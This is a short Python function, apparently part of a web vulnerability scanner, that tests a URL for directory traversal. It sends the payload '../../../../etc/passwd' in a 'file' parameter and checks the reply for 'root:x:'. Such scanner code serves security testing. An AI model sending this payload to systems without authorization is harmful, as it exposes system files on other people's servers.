import requests
from colorama import Fore

def test_directory_traversal(url, verbose=False, proxy=None):
    """
    Test for directory traversal vulnerability.
    Sends a payload attempting to access the system's `/etc/passwd` file.
    """
    payload = "../../../../etc/passwd"
    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        response = requests.get(url + "?file=" + payload, proxies=proxies, timeout=10)
        if verbose:
            print(f"Request to {url}?file={payload} - Status Code: {response.status_code}")

        if response and "root:x:" in response.text:
            print(Fore.RED + f"Directory Traversal vulnerability found at {url}?file=")
            return {"Directory Traversal": f"{url}?file="}
        else:
            return {}
    except Exception as e:
        print(Fore.RED + f"Error testing directory traversal at {url}: {e}")
        return {}
